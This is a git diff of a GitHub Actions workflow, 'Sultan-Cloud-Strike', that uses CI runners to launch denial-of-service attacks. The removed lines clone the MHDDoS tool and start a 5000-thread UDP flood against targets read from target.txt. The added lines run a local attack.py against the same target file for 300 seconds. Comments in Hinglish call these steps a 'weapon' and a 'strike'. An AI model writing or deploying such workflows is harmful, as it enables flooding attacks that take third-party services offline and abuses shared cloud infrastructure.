@@ -1,25 +1,28 @@
-name: Sultan-V600-Strike
-on: [push] # Push hote hi attack start
+name: Sultan-Cloud-Strike-V103
+
+on:
+  push:
+    branches: [ main ]
 
 jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Checkout code
+      - name: Checkout Code
         uses: actions/checkout@v3
 
-      - name: Prepare Weapon
-        run: |
-          sudo apt update
-          git clone --depth 1 https://github.com/MHProDev/MHDDoS.git
-          cd MHDDoS
-          pip3 install -r requirements.txt
+      - name: Set up Python
+        uses: actions/setup-python@v4
+        with:
+          python-version: '3.x'
 
-      - name: Execute 50,000 Threads Strike
+      - name: Install Dependencies
         run: |
-          cd MHDDoS
-          # Target file se data uthao
-          TARGET_INFO=$(cat ../target.txt)
-          # Power: 5000 threads, 1000 PPS per server
-          python3 start.py UDP $TARGET_INFO 10 5000 proxies.txt 1000 300
+          python -m pip install --upgrade pip
+          # Agar koi extra library chahiye toh yahan add kar sakte ho
+
+      - name: Execute Sultan Strike
+        run: |
+          # Sabse zaroori line: Bina ../ ke seedha target.txt read karna
+          python3 attack.py $(cat target.txt) 300
           
